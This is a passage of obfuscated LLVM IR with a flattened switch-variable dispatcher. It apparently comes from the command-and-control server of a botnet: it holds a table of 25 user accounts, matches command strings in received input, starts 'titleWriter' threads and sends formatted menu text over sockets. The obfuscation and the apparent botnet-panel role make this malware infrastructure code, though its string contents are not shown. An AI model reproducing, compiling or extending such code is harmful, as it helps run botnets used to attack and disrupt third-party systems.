  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:747:                                    ; preds = %loopEntry
  %748 = load i32, i32* %4, align 4
  %749 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %750 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %751 = call i64 @strlen(i8* %750) #8
  %752 = call i64 @send(i32 %748, i8* %749, i64 %751, i32 16384)
  %753 = icmp eq i64 %752, -1
  %754 = select i1 %753, i32 -701678034, i32 25785941
  store i32 %754, i32* %switchVar
  br label %loopEnd

; <label>:755:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:756:                                    ; preds = %loopEntry
  %757 = load i32, i32* %4, align 4
  %758 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %759 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %760 = call i64 @strlen(i8* %759) #8
  %761 = call i64 @send(i32 %757, i8* %758, i64 %760, i32 16384)
  %762 = icmp eq i64 %761, -1
  %763 = select i1 %762, i32 -524036999, i32 1809647693
  store i32 %763, i32* %switchVar
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:765:                                    ; preds = %loopEntry
  %766 = load i32, i32* %4, align 4
  %767 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %768 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %769 = call i64 @strlen(i8* %768) #8
  %770 = call i64 @send(i32 %766, i8* %767, i64 %769, i32 16384)
  %771 = icmp eq i64 %770, -1
  %772 = select i1 %771, i32 -501173829, i32 274130103
  store i32 %772, i32* %switchVar
  br label %loopEnd

; <label>:773:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:774:                                    ; preds = %loopEntry
  %775 = load i32, i32* %4, align 4
  %776 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %777 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %778 = call i64 @strlen(i8* %777) #8
  %779 = call i64 @send(i32 %775, i8* %776, i64 %778, i32 16384)
  %780 = icmp eq i64 %779, -1
  %781 = select i1 %780, i32 564977054, i32 -1524340207
  store i32 %781, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:783:                                    ; preds = %loopEntry
  %784 = load i8*, i8** %3, align 8
  %785 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %784) #7
  store i32 -907685291, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  %787 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %788 = load i32, i32* %5, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %789
  %791 = getelementptr inbounds %struct.account, %struct.account* %790, i32 0, i32 0
  %792 = getelementptr inbounds [20 x i8], [20 x i8]* %791, i32 0, i32 0
  %793 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %794 = call i32 (i8*, i8*, ...) @sprintf(i8* %787, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %792, i8* %793) #7
  %795 = load i32, i32* %4, align 4
  %796 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %797 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %798 = call i64 @strlen(i8* %797) #8
  %799 = call i64 @send(i32 %795, i8* %796, i64 %798, i32 16384)
  %800 = icmp eq i64 %799, -1
  %801 = select i1 %800, i32 1222605011, i32 -245485650
  store i32 %801, i32* %switchVar
  br label %loopEnd

; <label>:802:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:803:                                    ; preds = %loopEntry
  store i32 -2079122645, i32* %switchVar
  br label %loopEnd

; <label>:804:                                    ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:805:                                    ; preds = %loopEntry
  %806 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %807 = call i8* @strstr(i8* %806, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
  %808 = icmp ne i8* %807, null
  %809 = select i1 %808, i32 1035334070, i32 -439764605
  store i32 %809, i32* %switchVar
  br label %loopEnd

; <label>:810:                                    ; preds = %loopEntry
  %811 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %812 = call i8* @strstr(i8* %811, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0)) #8
  %813 = icmp ne i8* %812, null
  %814 = select i1 %813, i32 1035334070, i32 1371877037
  store i32 %814, i32* %switchVar
  br label %loopEnd

; <label>:815:                                    ; preds = %loopEntry
  %816 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %817 = call i8* @strstr(i8* %816, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %818 = icmp ne i8* %817, null
  %819 = select i1 %818, i32 1035334070, i32 -473455638
  store i32 %819, i32* %switchVar
  br label %loopEnd

; <label>:820:                                    ; preds = %loopEntry
  %821 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %822 = call i8* @strstr(i8* %821, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #8
  %823 = icmp ne i8* %822, null
  %824 = select i1 %823, i32 1035334070, i32 -1047871999
  store i32 %824, i32* %switchVar
  br label %loopEnd

; <label>:825:                                    ; preds = %loopEntry
  %826 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %827 = call i32 (i8*, i8*, ...) @sprintf(i8* %826, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i32 0, i32 0)) #7
  %828 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %829 = call i32 (i8*, i8*, ...) @sprintf(i8* %828, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %830 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %831 = call i32 (i8*, i8*, ...) @sprintf(i8* %830, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i32 0, i32 0)) #7
  %832 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %833 = call i32 (i8*, i8*, ...) @sprintf(i8* %832, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i32 0, i32 0)) #7
  %834 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %835 = call i32 (i8*, i8*, ...) @sprintf(i8* %834, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i32 0, i32 0)) #7
  %836 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %837 = call i32 (i8*, i8*, ...) @sprintf(i8* %836, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i32 0, i32 0)) #7
  %838 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %839 = call i32 (i8*, i8*, ...) @sprintf(i8* %838, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i32 0, i32 0)) #7
  %840 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %841 = call i32 (i8*, i8*, ...) @sprintf(i8* %840, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i32 0, i32 0)) #7
  %842 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %843 = call i32 (i8*, i8*, ...) @sprintf(i8* %842, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i32 0, i32 0)) #7
  %844 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %845 = call i32 (i8*, i8*, ...) @sprintf(i8* %844, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i32 0, i32 0)) #7
  %846 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %847 = call i32 (i8*, i8*, ...) @sprintf(i8* %846, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i32 0, i32 0)) #7
  %848 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %849 = call i32 (i8*, i8*, ...) @sprintf(i8* %848, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %850 = load i32, i32* %4, align 4
  %851 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %852 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %853 = call i64 @strlen(i8* %852) #8
  %854 = call i64 @send(i32 %850, i8* %851, i64 %853, i32 16384)
  %855 = icmp eq i64 %854, -1
  %856 = select i1 %855, i32 -64678657, i32 -1879494294
  store i32 %856, i32* %switchVar
  br label %loopEnd

; <label>:857:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:858:                                    ; preds = %loopEntry
  %859 = load i32, i32* %4, align 4
  %860 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %861 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %862 = call i64 @strlen(i8* %861) #8
  %863 = call i64 @send(i32 %859, i8* %860, i64 %862, i32 16384)
  %864 = icmp eq i64 %863, -1
  %865 = select i1 %864, i32 -893702319, i32 -1800208507
  store i32 %865, i32* %switchVar
  br label %loopEnd

; <label>:866:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:867:                                    ; preds = %loopEntry
  %868 = load i32, i32* %4, align 4
  %869 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %870 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %871 = call i64 @strlen(i8* %870) #8
  %872 = call i64 @send(i32 %868, i8* %869, i64 %871, i32 16384)
  %873 = icmp eq i64 %872, -1
  %874 = select i1 %873, i32 500185120, i32 1357934547
  store i32 %874, i32* %switchVar
  br label %loopEnd

; <label>:875:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:876:                                    ; preds = %loopEntry
  %877 = load i32, i32* %4, align 4
  %878 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %879 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %880 = call i64 @strlen(i8* %879) #8
  %881 = call i64 @send(i32 %877, i8* %878, i64 %880, i32 16384)
  %882 = icmp eq i64 %881, -1
  %883 = select i1 %882, i32 -1346518630, i32 -1084920819
  store i32 %883, i32* %switchVar
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:885:                                    ; preds = %loopEntry
  %886 = load i32, i32* %4, align 4
  %887 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %888 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %889 = call i64 @strlen(i8* %888) #8
  %890 = call i64 @send(i32 %886, i8* %887, i64 %889, i32 16384)
  %891 = icmp eq i64 %890, -1
  %892 = select i1 %891, i32 1225560467, i32 417215622
  store i32 %892, i32* %switchVar
  br label %loopEnd

; <label>:893:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:894:                                    ; preds = %loopEntry
  %895 = load i32, i32* %4, align 4
  %896 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %897 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %898 = call i64 @strlen(i8* %897) #8
  %899 = call i64 @send(i32 %895, i8* %896, i64 %898, i32 16384)
  %900 = icmp eq i64 %899, -1
  %901 = select i1 %900, i32 -2047048484, i32 -374133876
  store i32 %901, i32* %switchVar
  br label %loopEnd

; <label>:902:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  %904 = load i32, i32* %4, align 4
  %905 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %906 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %907 = call i64 @strlen(i8* %906) #8
  %908 = call i64 @send(i32 %904, i8* %905, i64 %907, i32 16384)
  %909 = icmp eq i64 %908, -1
  %910 = select i1 %909, i32 168172335, i32 490997342
  store i32 %910, i32* %switchVar
  br label %loopEnd

; <label>:911:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:912:                                    ; preds = %loopEntry
  %913 = load i32, i32* %4, align 4
  %914 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %915 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %916 = call i64 @strlen(i8* %915) #8
  %917 = call i64 @send(i32 %913, i8* %914, i64 %916, i32 16384)
  %918 = icmp eq i64 %917, -1
  %919 = select i1 %918, i32 368034310, i32 -74898170
  store i32 %919, i32* %switchVar
  br label %loopEnd

; <label>:920:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:921:                                    ; preds = %loopEntry
  %922 = load i32, i32* %4, align 4
  %923 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %924 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %925 = call i64 @strlen(i8* %924) #8
  %926 = call i64 @send(i32 %922, i8* %923, i64 %925, i32 16384)
  %927 = icmp eq i64 %926, -1
  %928 = select i1 %927, i32 -1131827051, i32 1653702422
  store i32 %928, i32* %switchVar
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:930:                                    ; preds = %loopEntry
  %931 = load i32, i32* %4, align 4
  %932 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %933 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %934 = call i64 @strlen(i8* %933) #8
  %935 = call i64 @send(i32 %931, i8* %932, i64 %934, i32 16384)
  %936 = icmp eq i64 %935, -1
  %937 = select i1 %936, i32 2105261316, i32 -27977057
  store i32 %937, i32* %switchVar
  br label %loopEnd

; <label>:938:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:939:                                    ; preds = %loopEntry
  %940 = load i32, i32* %4, align 4
  %941 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %942 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %943 = call i64 @strlen(i8* %942) #8
  %944 = call i64 @send(i32 %940, i8* %941, i64 %943, i32 16384)
  %945 = icmp eq i64 %944, -1
  %946 = select i1 %945, i32 344562666, i32 201327570
  store i32 %946, i32* %switchVar
  br label %loopEnd

; <label>:947:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  %949 = load i32, i32* %4, align 4
  %950 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %951 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %952 = call i64 @strlen(i8* %951) #8
  %953 = call i64 @send(i32 %949, i8* %950, i64 %952, i32 16384)
  %954 = icmp eq i64 %953, -1
  %955 = select i1 %954, i32 1744020619, i32 122240678
  store i32 %955, i32* %switchVar
  br label %loopEnd

; <label>:956:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:957:                                    ; preds = %loopEntry
  %958 = load i8*, i8** %3, align 8
  %959 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %958) #7
  store i32 -1315182204, i32* %switchVar
  br label %loopEnd

; <label>:960:                                    ; preds = %loopEntry
  %961 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %962 = load i32, i32* %5, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %963
  %965 = getelementptr inbounds %struct.account, %struct.account* %964, i32 0, i32 0
  %966 = getelementptr inbounds [20 x i8], [20 x i8]* %965, i32 0, i32 0
  %967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %968 = call i32 (i8*, i8*, ...) @sprintf(i8* %961, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %966, i8* %967) #7
  %969 = load i32, i32* %4, align 4
  %970 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %971 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %972 = call i64 @strlen(i8* %971) #8
  %973 = call i64 @send(i32 %969, i8* %970, i64 %972, i32 16384)
  %974 = icmp eq i64 %973, -1
  %975 = select i1 %974, i32 1959880338, i32 -173989951
  store i32 %975, i32* %switchVar
  br label %loopEnd

; <label>:976:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:977:                                    ; preds = %loopEntry
  store i32 -1505378814, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  %980 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %981 = call i8* @strstr(i8* %980, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.81, i32 0, i32 0)) #8
  %982 = icmp ne i8* %981, null
  %983 = select i1 %982, i32 -540775182, i32 -1064318943
  store i32 %983, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %986 = call i8* @strstr(i8* %985, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.82, i32 0, i32 0)) #8
  %987 = icmp ne i8* %986, null
  %988 = select i1 %987, i32 -540775182, i32 -417270617
  store i32 %988, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %991 = call i8* @strstr(i8* %990, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i32 0, i32 0)) #8
  %992 = icmp ne i8* %991, null
  %993 = select i1 %992, i32 -540775182, i32 -1949208803
  store i32 %993, i32* %switchVar
  br label %loopEnd

; <label>:994:                                    ; preds = %loopEntry
  %995 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %996 = call i8* @strstr(i8* %995, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0)) #8
  %997 = icmp ne i8* %996, null
  %998 = select i1 %997, i32 -540775182, i32 -1448467956
  store i32 %998, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  %1000 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1001 = call i8* @strstr(i8* %1000, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0)) #8
  %1002 = icmp ne i8* %1001, null
  %1003 = select i1 %1002, i32 -540775182, i32 404138287
  store i32 %1003, i32* %switchVar
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  %1005 = load i8*, i8** %3, align 8
  %1006 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1005) #7
  %1007 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %1008 = call i32 (i8*, i8*, ...) @sprintf(i8* %1007, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.86, i32 0, i32 0)) #7
  %1009 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %1010 = call i32 (i8*, i8*, ...) @sprintf(i8* %1009, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1011 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %1012 = call i32 (i8*, i8*, ...) @sprintf(i8* %1011, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.87, i32 0, i32 0)) #7
  %1013 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %1014 = call i32 (i8*, i8*, ...) @sprintf(i8* %1013, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.88, i32 0, i32 0)) #7
  %1015 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %1016 = call i32 (i8*, i8*, ...) @sprintf(i8* %1015, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1017 = load i32, i32* %4, align 4
  %1018 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %1019 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %1020 = call i64 @strlen(i8* %1019) #8
  %1021 = call i64 @send(i32 %1017, i8* %1018, i64 %1020, i32 16384)
  %1022 = icmp eq i64 %1021, -1
  %1023 = select i1 %1022, i32 -609964908, i32 1652929251
  store i32 %1023, i32* %switchVar
  br label %loopEnd

; <label>:1024:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1025:                                   ; preds = %loopEntry
  %1026 = load i32, i32* %4, align 4
  %1027 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %1028 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %1029 = call i64 @strlen(i8* %1028) #8
  %1030 = call i64 @send(i32 %1026, i8* %1027, i64 %1029, i32 16384)
  %1031 = icmp eq i64 %1030, -1
  %1032 = select i1 %1031, i32 2137380111, i32 1475734415
  store i32 %1032, i32* %switchVar
  br label %loopEnd

; <label>:1033:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i32, i32* %4, align 4
  %1036 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %1037 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %1038 = call i64 @strlen(i8* %1037) #8
  %1039 = call i64 @send(i32 %1035, i8* %1036, i64 %1038, i32 16384)
  %1040 = icmp eq i64 %1039, -1
  %1041 = select i1 %1040, i32 16319750, i32 2145560890
  store i32 %1041, i32* %switchVar
  br label %loopEnd

; <label>:1042:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1043:                                   ; preds = %loopEntry
  %1044 = load i32, i32* %4, align 4
  %1045 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %1046 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %1047 = call i64 @strlen(i8* %1046) #8
  %1048 = call i64 @send(i32 %1044, i8* %1045, i64 %1047, i32 16384)
  %1049 = icmp eq i64 %1048, -1
  %1050 = select i1 %1049, i32 -600126780, i32 464556150
  store i32 %1050, i32* %switchVar
  br label %loopEnd

; <label>:1051:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1052:                                   ; preds = %loopEntry
  %1053 = load i32, i32* %4, align 4
  %1054 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %1055 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %1056 = call i64 @strlen(i8* %1055) #8
  %1057 = call i64 @send(i32 %1053, i8* %1054, i64 %1056, i32 16384)
  %1058 = icmp eq i64 %1057, -1
  %1059 = select i1 %1058, i32 1322531194, i32 393627757
  store i32 %1059, i32* %switchVar
  br label %loopEnd

; <label>:1060:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1061:                                   ; preds = %loopEntry
  %1062 = load i8*, i8** %3, align 8
  %1063 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1062) #7
  store i32 1420325796, i32* %switchVar
  br label %loopEnd

; <label>:1064:                                   ; preds = %loopEntry
  %1065 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1066 = load i32, i32* %5, align 4
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1067
  %1069 = getelementptr inbounds %struct.account, %struct.account* %1068, i32 0, i32 0
  %1070 = getelementptr inbounds [20 x i8], [20 x i8]* %1069, i32 0, i32 0
  %1071 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1072 = call i32 (i8*, i8*, ...) @sprintf(i8* %1065, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1070, i8* %1071) #7
  %1073 = load i32, i32* %4, align 4
  %1074 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1075 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1076 = call i64 @strlen(i8* %1075) #8
  %1077 = call i64 @send(i32 %1073, i8* %1074, i64 %1076, i32 16384)
  %1078 = icmp eq i64 %1077, -1
  %1079 = select i1 %1078, i32 782811879, i32 -595604909
  store i32 %1079, i32* %switchVar
  br label %loopEnd

; <label>:1080:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1081:                                   ; preds = %loopEntry
  store i32 887431271, i32* %switchVar
  br label %loopEnd

; <label>:1082:                                   ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  %1084 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1085 = call i8* @strstr(i8* %1084, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0)) #8
  %1086 = icmp ne i8* %1085, null
  %1087 = select i1 %1086, i32 1589300125, i32 -374422586
  store i32 %1087, i32* %switchVar
  br label %loopEnd

; <label>:1088:                                   ; preds = %loopEntry
  %1089 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1090 = call i8* @strstr(i8* %1089, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0)) #8
  %1091 = icmp ne i8* %1090, null
  %1092 = select i1 %1091, i32 1589300125, i32 -1393390192
  store i32 %1092, i32* %switchVar
  br label %loopEnd

; <label>:1093:                                   ; preds = %loopEntry
  %1094 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1095 = call i8* @strstr(i8* %1094, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0)) #8
  %1096 = icmp ne i8* %1095, null
  %1097 = select i1 %1096, i32 1589300125, i32 856870603
  store i32 %1097, i32* %switchVar
  br label %loopEnd

; <label>:1098:                                   ; preds = %loopEntry
  %1099 = load i8*, i8** %3, align 8
  %1100 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1099) #7
  %1101 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1102 = call i32 (i8*, i8*, ...) @sprintf(i8* %1101, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0)) #7
  %1103 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1104 = call i32 (i8*, i8*, ...) @sprintf(i8* %1103, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1105 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1106 = call i32 (i8*, i8*, ...) @sprintf(i8* %1105, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.93, i32 0, i32 0)) #7
  %1107 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1108 = call i32 (i8*, i8*, ...) @sprintf(i8* %1107, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.94, i32 0, i32 0)) #7
  %1109 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1110 = call i32 (i8*, i8*, ...) @sprintf(i8* %1109, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.95, i32 0, i32 0)) #7
  %1111 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
